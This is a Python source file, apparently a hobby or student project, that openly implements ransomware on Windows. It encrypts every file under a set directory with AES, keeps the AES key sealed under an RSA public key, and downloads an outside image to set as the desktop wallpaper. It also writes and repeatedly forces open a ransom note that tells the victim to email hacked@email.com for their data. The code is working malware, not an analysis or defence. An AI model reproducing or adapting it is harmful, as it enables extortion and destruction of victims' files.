import os
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
from Crypto import Random
import hashlib
import base64
import urllib.request
import ctypes
import datetime
import time
import win32gui
import subprocess


# This is a sample Python script.

# Press ⌃R to execute it or replace it with your code.
# Press Double ⇧ to search everywhere for classes, files, tool windows, actions, and settings.


def note():
    date = datetime.date.today().strftime("%d-%B-%Y")
    with open('Hacker_note.txt', 'w') as f:
        f.write(
            "The disk of your computer has been hacked the day: {0:s}\nIn order to retrieve your data send a email to hacked@email.com".format(
                date))


def show_note():
    process = subprocess.Popen(['notepad.exe', 'Hacker_note.txt'])
    count = 0
    while count < 5:
        time.sleep(0.1)
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        if not window == 'Hacker_note - Notepad':
            time.sleep(0.1)
            process.kill()
            time.sleep(0.1)
            process = subprocess.Popen(['notepad.exe', 'Hacker_note.txt'])
        time.sleep(10)
        count += 1


class Ransomware:

    def __init__(self, decrypt=False):
        self.key = None
        self.public_key = None
        self.decrypt = decrypt
        self.root = os.path.expanduser('~')
        self.system = r'C:\Example'

    def get_AES_key(self):
        if not self.decrypt:
            self.key = base64.b64encode(Random.new().read(128))
            self.encrypt_AES_key()
        else:
            self.decrypt_AES_key()

        self.key = hashlib.sha256(self.key).digest()

    def decrypt_AES_key(self):
        private_key = RSA.import_key(open('private.pem').read())
        cipher_rsa = PKCS1_OAEP.new(private_key)
        with open("aes_encrypted_key.txt", 'rb') as f:
            aes_key = f.read()
        self.key = cipher_rsa.decrypt(aes_key)

    def encrypt_AES_key(self):
        self.public_key = RSA.import_key(open('public.pem').read())
        cipher_rsa = PKCS1_OAEP.new(self.public_key)
        encrypted_aes_key = cipher_rsa.encrypt(self.key)
        with open("aes_encrypted_key.txt", 'wb') as f:
            f.write(encrypted_aes_key)

    def check_system(self, decrypt=False):

        system = os.walk(self.system, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                self.check_file(file_path, decrypt)

    def check_file(self, file_path, decrypt):

        with open(file_path, 'rb') as f:
            data = f.read()

            if not decrypt:
                data = pad(data, AES.block_size)
                iv = Random.new().read(AES.block_size)
                print(iv)
                print(base64.b64encode(iv))
                print(AES.block_size)
                cipher = AES.new(self.key, AES.MODE_CBC, iv)
                data = base64.b64encode(iv + cipher.encrypt(data))
                with open(file_path, 'wb') as f:
                    f.write(data)
            else:
                print(data)
                data = base64.b64decode(data)
                iv = data[:AES.block_size]
                print(iv)
                cipher = AES.new(self.key, AES.MODE_CBC, iv)
                data = unpad(cipher.decrypt(data[AES.block_size:]), AES.block_size)
                with open(file_path, 'wb') as f:
                    f.write(data)

    def run(self):
        self.get_AES_key()
        self.check_system(self.decrypt)

    def photo_background(self):
        photo_url = "https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876" \
                    "-100749983-large.jpg "
        path = "{0:s}\\Desktop\\back.jpg".format(self.root)
        urllib.request.urlretrieve(photo_url, path)
        SPI_SETDESWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESWALLPAPER, 0, path, 0)


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    public = False
    private = False
    if os.path.exists("public.pem"):
        public = True
    if os.path.exists("private.pem"):
        private = True
    if private:
        ransomware = Ransomware(private)
        ransomware.run()
    elif public:
        ransomware = Ransomware()
        ransomware.run()
        ransomware.photo_background()
        note()
        show_note()

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
